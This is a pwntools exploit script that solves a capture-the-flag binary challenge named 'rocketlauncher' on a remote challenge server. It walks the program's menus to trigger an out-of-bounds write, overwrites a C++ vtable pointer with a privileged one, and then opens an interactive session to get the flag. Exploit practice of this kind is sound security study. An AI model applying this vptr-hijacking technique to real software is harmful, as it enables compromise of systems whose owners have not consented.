#!/bin/python
from pwn import *

elf = context.binary = ELF('./rocketlauncher', checksec=False)

# p = process()
p = remote("undutmaning-rocketlauncher.chals.io", 443, ssl=True, sni="undutmaning-rocketlauncher.chals.io")  

# First rocket
p.clean()
p.sendline(b'1')

p.clean()
p.sendline(b'small')

p.clean()
p.sendline(b'1')

p.clean()
p.sendline(b'1')

p.clean()
p.sendline(b'1')

p.clean()
p.sendline(b'1')


#Second rocket
p.clean()
p.sendline(b'1')

p.clean()
p.sendline(b'small')

p.clean()
p.sendline(b'2')

p.clean()
p.sendline(b'2')

p.clean()
p.sendline(b'2')

p.clean()
p.sendline(b'2')

# Rebuilding
p.clean()
p.sendline(b'2')

# OOB write comes here!
p.clean()
p.sendline(b'big')

p.clean()
p.sendline(b'0')

# Sends same value as before
val = p.recvuntil(b'= ').split(b'previously ')[-1][:-4]
p.sendline(val)

val = p.recvuntil(b'= ').split(b'previously ')[-1][:-4]
p.sendline(val)

val = p.recvuntil(b'= ').split(b'previously ')[-1][:-4]
p.sendline(val)

val = p.recvuntil(b'= ').split(b'previously ')[-1][:-4]
p.sendline(val)

val = p.recvuntil(b'= ').split(b'previously ')[-1][:-4]
p.sendline(val)

val = p.recvuntil(b'= ').split(b'previously ')[-1][:-4]
p.sendline(val)

val = p.recvuntil(b'= ').split(b'previously ')[-1][:-4]
p.sendline(val)

val = p.recvuntil(b'= ').split(b'previously ')[-1][:-4]
p.sendline(val)

val = p.recvuntil(b'= ').split(b'previously ')[-1][:-4]
p.sendline(val)

# Overwriting vptr
val = p.recvuntil(b'= ').split(b'previously ')[-1][:-4]
val = int(val.decode('latin-1'))
log.info(f'addr: {val}')
p.sendline(str(val - 24).encode()) # privileged vptr is 24 before our value

val = p.recvuntil(b'= ').split(b'previously ')[-1][:-4]
log.info(f'value: {val.decode('latin-1')}')
p.sendline(val)

val = p.recvuntil(b'= ').split(b'previously ')[-1][:-4]
log.info(f'value: {val.decode('latin-1')}')
p.sendline(val)

val = p.recvuntil(b'= ').split(b'previously ')[-1][:-4]
log.info(f'value: {val.decode('latin-1')}')
p.sendline(val)

val = p.recvuntil(b'= ').split(b'previously ')[-1][:-4]
log.info(f'value: {val.decode('latin-1')}')
p.sendline(val)

val = p.recvuntil(b'= ').split(b'previously ')[-1][:-4]
log.info(f'value: {val.decode('latin-1')}')
p.sendline(val)

val = p.recvuntil(b'= ').split(b'previously ')[-1][:-4]
log.info(f'value: {val.decode('latin-1')}')
p.sendline(val)

# Launching
p.clean()
p.sendline(b'3')

p.clean()
p.sendline(b'1')

# Flag time!!!
p.interactive()

